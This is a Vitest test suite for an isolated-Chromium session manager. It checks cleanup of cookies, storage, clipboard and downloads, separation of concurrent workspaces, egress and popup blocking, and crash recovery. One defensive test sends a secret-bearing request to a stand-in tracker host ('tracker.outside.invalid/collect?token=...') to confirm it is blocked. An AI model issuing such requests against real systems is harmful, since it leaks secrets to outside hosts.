import { existsSync } from "node:fs";
import { readdir, readFile } from "node:fs/promises";
import { afterEach, describe, expect, it } from "vitest";
import {
  startFixtureServer,
  type ControlledFixtureServer,
} from "../../apps/fixture/src/index";
import {
  BrowserIsolationManager,
  type IsolatedBrowserSession,
} from "../../apps/runner/src/isolated-browser";

const managers: BrowserIsolationManager[] = [];
const servers: ControlledFixtureServer[] = [];

afterEach(async () => {
  await Promise.all(managers.splice(0).map((manager) => manager.shutdown()));
  await Promise.all(servers.splice(0).map((server) => server.close()));
});

async function fixture(seed: string) {
  const server = await startFixtureServer({
    host: "127.0.0.1",
    port: 0,
    seed,
    version: "BASELINE",
  });
  servers.push(server);
  return server;
}

function manager() {
  const instance = new BrowserIsolationManager({
    launchArgs: [
      "--host-resolver-rules=MAP *.pactwire.test 127.0.0.1,EXCLUDE localhost",
    ],
  });
  managers.push(instance);
  return instance;
}

function sessionConfig(
  server: ControlledFixtureServer,
  runId: string,
  overrides: Readonly<Record<string, unknown>> = {},
) {
  return {
    workspaceId: "11111111-1111-4111-8111-111111111111",
    runId,
    allowedNavigationOrigins: [server.classroomOrigin],
    allowedNetworkHosts: [
      "classroom.pactwire.test",
      "classroom-service.pactwire.test",
    ],
    popupPolicy: "BLOCK_ALL",
    downloadPolicy: "ALLOW_ISOLATED",
    clipboardPolicy: "ISOLATED",
    viewport: { width: 1280, height: 900 },
    ...overrides,
  };
}

async function seedBrowserState(
  session: IsolatedBrowserSession,
  server: ControlledFixtureServer,
  marker: string,
) {
  await session.page.goto(`${server.classroomOrigin}/student`);
  await session.page.evaluate((value) => {
    document.cookie = `run-marker=${value}; SameSite=Lax`;
    localStorage.setItem("run-marker", value);
    return navigator.clipboard.writeText(value);
  }, marker);
}

async function readBrowserState(session: IsolatedBrowserSession) {
  return session.page.evaluate(async () => ({
    cookie: document.cookie,
    localStorage: localStorage.getItem("run-marker"),
    clipboard: await navigator.clipboard.readText(),
  }));
}

async function createDownload(session: IsolatedBrowserSession) {
  const downloadPromise = session.page.waitForEvent("download");
  await session.page.evaluate(() => {
    const anchor = document.createElement("a");
    anchor.href = "data:text/plain;charset=utf-8,fictional-isolation-download";
    anchor.download = "fictional-run.txt";
    document.body.append(anchor);
    anchor.click();
    anchor.remove();
  });
  return downloadPromise;
}

describe("isolated Chromium execution", () => {
  it("destroys cookies, storage, credentials, clipboard, and download files before the next run", async () => {
    const server = await fixture("run-01-sequential-isolation");
    const isolation = manager();
    const first = await isolation.startSession(
      sessionConfig(server, "22222222-2222-4222-8222-222222222222"),
    );
    await seedBrowserState(first, server, "FIRST-RUN-FICTIONAL-CREDENTIAL");
    const download = await createDownload(first);
    const downloadPath = await download.path();
    expect(existsSync(downloadPath)).toBe(true);

    await first.finalizeArtifacts(async (scope) => {
      expect(scope.downloadDirectory).toContain(scope.runId);
      expect(await readFile(downloadPath, "utf8")).toBe(
        "fictional-isolation-download",
      );
      expect(scope.events.some((event) => event.type === "FINALIZATION_STARTED")).toBe(
        true,
      );
      return undefined;
    });
    expect(first.state).toBe("CLOSED");
    expect(existsSync(downloadPath)).toBe(false);
    await expect(first.diagnostics()).resolves.toMatchObject({
      browserConnected: false,
      temporaryRootExists: false,
    });

    const second = await isolation.startSession(
      sessionConfig(server, "33333333-3333-4333-8333-333333333333"),
    );
    await second.page.goto(`${server.classroomOrigin}/student`);
    await expect(readBrowserState(second)).resolves.toEqual({
      cookie: "",
      localStorage: null,
      clipboard: "",
    });
    await second.finalizeArtifacts(async (scope) => {
      await expect(readdir(scope.downloadDirectory)).resolves.toEqual([]);
      return undefined;
    });
    expect(isolation.activeSessionCount).toBe(0);
  });

  it("keeps concurrent workspaces in separate browser processes and resource scopes", async () => {
    const server = await fixture("run-01-concurrent-isolation");
    const isolation = manager();
    const [left, right] = await Promise.all([
      isolation.startSession(
        sessionConfig(server, "44444444-4444-4444-8444-444444444444"),
      ),
      isolation.startSession({
        ...sessionConfig(server, "55555555-5555-4555-8555-555555555555"),
        workspaceId: "66666666-6666-4666-8666-666666666666",
      }),
    ]);
    await Promise.all([
      seedBrowserState(left, server, "LEFT-FICTIONAL-CREDENTIAL"),
      seedBrowserState(right, server, "RIGHT-FICTIONAL-CREDENTIAL"),
    ]);

    await expect(readBrowserState(left)).resolves.toEqual({
      cookie: "run-marker=LEFT-FICTIONAL-CREDENTIAL",
      localStorage: "LEFT-FICTIONAL-CREDENTIAL",
      clipboard: "LEFT-FICTIONAL-CREDENTIAL",
    });
    await expect(readBrowserState(right)).resolves.toEqual({
      cookie: "run-marker=RIGHT-FICTIONAL-CREDENTIAL",
      localStorage: "RIGHT-FICTIONAL-CREDENTIAL",
      clipboard: "RIGHT-FICTIONAL-CREDENTIAL",
    });
    const [leftDiagnostics, rightDiagnostics] = await Promise.all([
      left.diagnostics(),
      right.diagnostics(),
    ]);
    expect(leftDiagnostics.browserId).not.toBe(rightDiagnostics.browserId);
    expect(leftDiagnostics.contextId).not.toBe(rightDiagnostics.contextId);
    expect(leftDiagnostics.downloadDirectory).not.toBe(
      rightDiagnostics.downloadDirectory,
    );
    expect(isolation.activeSessionCount).toBe(2);

    await Promise.all([
      left.finalizeArtifacts(() => Promise.resolve(undefined)),
      right.finalizeArtifacts(() => Promise.resolve(undefined)),
    ]);
    expect(isolation.activeSessionCount).toBe(0);
  });

  it("blocks out-of-scope navigation, subresource egress, and popups without retaining a secret query", async () => {
    const server = await fixture("run-01-egress-policy");
    const isolation = manager();
    const session = await isolation.startSession(
      sessionConfig(server, "77777777-7777-4777-8777-777777777777"),
    );
    await session.page.goto(`${server.classroomOrigin}/student`);

    const fixturePort = new URL(server.classroomOrigin).port;
    await session.page.evaluate(
      async ({ popupUrl, trackerUrl }) => {
        await fetch(trackerUrl).catch(() => undefined);
        window.open(popupUrl, "fixture-popup");
      },
      {
        popupUrl: `${server.classroomOrigin}/teacher`,
        trackerUrl: `http://tracker.pactwire.test:${fixturePort}/pixel`,
      },
    );
    await expect
      .poll(() => session.violations.length, { timeout: 5_000 })
      .toBeGreaterThanOrEqual(2);
    await session.page.evaluate(
      (webSocketUrl) =>
        new Promise<void>((resolve) => {
          const socket = new WebSocket(webSocketUrl);
          socket.addEventListener("close", () => resolve(), { once: true });
          socket.addEventListener("error", () => resolve(), { once: true });
          setTimeout(resolve, 1_000);
        }),
      `ws://tracker.pactwire.test:${fixturePort}/events`,
    );
    await expect
      .poll(
        () =>
          session.violations.filter(
            (violation) => violation.targetHost === "tracker.pactwire.test",
          ).length,
        { timeout: 5_000 },
      )
      .toBeGreaterThanOrEqual(2);
    await expect(
      session.page.goto(
        "http://tracker.outside.invalid/collect?token=FICTIONAL-SECRET-QUERY",
      ),
    ).rejects.toThrow();
    await expect
      .poll(() => session.violations.length, { timeout: 5_000 })
      .toBeGreaterThanOrEqual(4);
    expect(session.violations.map((violation) => violation.reason)).toEqual(
      expect.arrayContaining([
        "NAVIGATION_ORIGIN_BLOCKED",
        "NETWORK_HOST_BLOCKED",
        "POPUP_BLOCKED",
      ]),
    );
    expect(JSON.stringify(session.violations)).not.toContain(
      "FICTIONAL-SECRET-QUERY",
    );

    await session.finalizeArtifacts(() => Promise.resolve(undefined));
  });

  it("blocks downloads and the system clipboard when the run policy denies them", async () => {
    const server = await fixture("run-01-denied-local-capabilities");
    const isolation = manager();
    const session = await isolation.startSession(
      sessionConfig(server, "88888888-8888-4888-8888-888888888888", {
        downloadPolicy: "BLOCK",
        clipboardPolicy: "BLOCK",
      }),
    );
    await session.page.goto(`${server.classroomOrigin}/student`);

    await expect(
      session.page.evaluate(() => navigator.clipboard.writeText("blocked")),
    ).rejects.toThrow(/not allowed/i);
    const download = await createDownload(session);
    await expect(download.failure()).resolves.toMatch(/acceptDownloads|denied/i);
    await expect(download.path()).rejects.toThrow();
    await session.finalizeArtifacts(async (scope) => {
      await expect(readdir(scope.downloadDirectory)).resolves.toEqual([]);
      return undefined;
    });
  });

  it("cleans a crashed renderer and starts recovery without its browser state", async () => {
    const server = await fixture("run-01-crash-recovery");
    const isolation = manager();
    const crashed = await isolation.startSession(
      sessionConfig(server, "99999999-9999-4999-8999-999999999999"),
    );
    await seedBrowserState(crashed, server, "CRASHED-FICTIONAL-CREDENTIAL");
    const crashEvent = crashed.page.waitForEvent("crash");
    const cdp = await crashed.page.context().newCDPSession(crashed.page);
    await cdp.send("Page.crash").catch(() => undefined);
    await crashEvent;
    await crashed.waitForTermination();
    expect(crashed.state).toBe("CRASHED");
    await expect(crashed.diagnostics()).resolves.toMatchObject({
      browserConnected: false,
      temporaryRootExists: false,
    });

    const recovered = await isolation.startSession(
      sessionConfig(server, "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"),
    );
    await recovered.page.goto(`${server.classroomOrigin}/student`);
    await expect(readBrowserState(recovered)).resolves.toEqual({
      cookie: "",
      localStorage: null,
      clipboard: "",
    });
    await recovered.finalizeArtifacts(() => Promise.resolve(undefined));
  });
});
